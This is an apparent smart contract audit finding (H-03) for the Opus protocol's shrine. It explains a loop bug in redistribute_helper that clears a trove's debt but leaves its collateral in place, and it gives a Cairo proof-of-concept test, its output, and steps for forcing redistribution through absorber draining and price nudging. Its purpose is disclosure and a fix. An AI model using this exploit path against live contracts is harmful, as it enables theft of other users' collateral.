[H-03] A user can steal from the shrine by forcing redistribution of their trove; due to incorrect logic trove debt will be reset but yangs kept
Submitted bykfx, also found bybin2chen,minhquanym, andTrungOre
Let’s assume two yangs in the system, yang A and yang B, and two users:
User U1 with trove #1 with zero A units, 1000 B units, and 500 yin debt;User U2 with trove #2 10000 A unit, 1000 B units, and 500 yin debt.
If the user U1 can force redistribution of their position, then they can steal from the shrine due to a bug in the code. The functionredistribute_helperloops through all yangs in order, including those not in the trove #1. Sincetrove_yang_amt.is_zero()returnstruefor yang A, theupdated_trove_yang_balancesarray is updated early and thencontinuestatement is executed.
However, since thenew_yang_totalsarray is not updated in the iteration of the loop, some values ofupdated_trove_yang_balancesend up never being used.
Let’s assume 100% redistribution. After the all loop is fully executed, the two arrays contain:
updated_trove_yang_balances = [(A, 0), (B, 0)];new_yang_totals = [(B, 1000)];
The final loop of the function is executed just once. Its first and only iteration writes the new total B value. However, it does not update the amount of B in the trove #1, since(B, 0)is the second element of the first array.
The final state is that trove #1 still has 1000 units of B, but no more debt. The user U1 can now withdraw all 1000 units from the trove #1.
This bug violates the shrine invariant “The total amount of a yang is equal to the sum of all troves’ deposits of that yang (this includes any exceptionally redistributed yangs and their accompanying errors) and the initial amount seeded at the time ofadd_yang.”
Proof of Concept
#[test]fn test_shrine_redistribution_bug() {let shrine: IShrineDispatcher = shrine_utils::shrine_setup_with_feed(Option::None);// Manually set up troves so that all troves uses just yang1let yangs: Span<ContractAddress> = shrine_utils::three_yang_addrs_reversed();let yang_addr = *yangs.at(1); // select the middle onelet forge_amt: u128 = 1_000_000_000_000_000_000_000;// Set up trove1 with some yang and some debtlet trove1_owner = common::trove1_owner_addr();let redistributed_trove: u64 = common::TROVE_1;start_prank(CheatTarget::All, shrine_utils::admin());shrine.deposit(yang_addr, redistributed_trove, shrine_utils::TROVE1_YANG1_DEPOSIT.into());shrine.forge(trove1_owner, redistributed_trove, forge_amt.into(), 0_u128.into());// Set up trove1 with some yang and some debtlet trove2_owner = common::trove2_owner_addr();let recipient_trove: u64 = common::TROVE_2;shrine.deposit(yang_addr, recipient_trove, shrine_utils::TROVE1_YANG1_DEPOSIT.into());shrine.forge(trove2_owner, recipient_trove, forge_amt.into(), 0_u128.into());println!("before:");println!(" trove1 yang={}", shrine.get_deposit(yang_addr, redistributed_trove).val);println!(" trove2 yang={}", shrine.get_deposit(yang_addr, recipient_trove).val);println!(" total yang: {}", shrine.get_yang_total(yang_addr));// Simulate complete redistribution of trove1shrine.redistribute(redistributed_trove, trove1_health.debt, RAY_ONE.into());println!("after:");println!(" trove1 yang={}", shrine.get_deposit(yang_addr, redistributed_trove).val);println!(" trove2 yang={}", shrine.get_deposit(yang_addr, recipient_trove).val);println!(" total yang: {}", shrine.get_yang_total(yang_addr));shrine_utils::assert_shrine_invariants(shrine, yangs, 2);}
Output:
before:trove1 yang=5000000000000000000trove2 yang=5000000000000000000trove1 value=2895610636113415002820 ltv=345350299355935952856010534 debt=1000000000000000000000trove2 value=2895610636113415002820 ltv=345350299355935952856010534 debt=1000000000000000000000after:trove1 yang=5000000000000000000trove2 yang=5000000000000000000trove1 value=2895610636113415002820 ltv=0 debt=0trove2 value=2895610636113415002820 ltv=690700598711871905712021068 debt=2000000000000000000000
Expected output:
after:trove1 yang=0trove2 yang=5000000000000000000trove1 value=0 ltv=0 debt=0trove2 value=2895610636113415002820 ltv=690700598711871905712021068 debt=2000000000000000000000
One question is: how difficult is it to force the redistribution? It looks like it’s a realistic option in some cases. For instance, the attacker could first drain the stability pool (absorber) by forcing absorbtions until it is empty. A liquidation can be forced by borrowing max amount and then waiting forltv > thresholdto happen due to small price fluctuations, potentially even manipulating the price slightly (as only a small change is required to cross the threshold). For a collateral asset with asset’sthreshold > ABSORPTION_THRESHOLDit’s not required that the trove’spenalty == max_possible_penalty.
Recommended Mitigation Steps
Do not update the arrayupdated_trove_yang_balancesbefore thecontinuestatement.
Assessed type
Loop
tserg (Opus) confirmed and commented via duplicate issue #199:
This is valid - potentially fixed.
0xsomeone (judge) commented:
The warden has demonstrated how a debt redistribution will maintain incorrect entries in the updated Yang balances and total Yang balances when skipping over one, weaponizing this behavior to acquire collateral from a shrine.I believe a high-risk evaluation is apt as collateral of other users is directly impacted.